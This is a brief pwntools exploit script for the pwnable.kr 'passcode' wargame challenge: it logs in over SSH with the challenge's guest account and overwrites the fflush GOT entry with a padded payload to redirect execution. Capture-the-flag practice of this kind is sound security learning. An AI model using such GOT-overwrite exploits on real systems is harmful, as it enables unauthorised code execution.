from pwn import *

ssh = ssh(user = 'passcode', host = 'pwnable.kr', password = 'guest', port = 2222)
p = ssh.process(executable='passcode')


payload = b'a'*96
payload += p32(0x804a004) # the address of fflush in GOT
return_add = str(0x080485d7) # return address

p.sendline(payload)
p.sendline(return_add)

p.interactive()
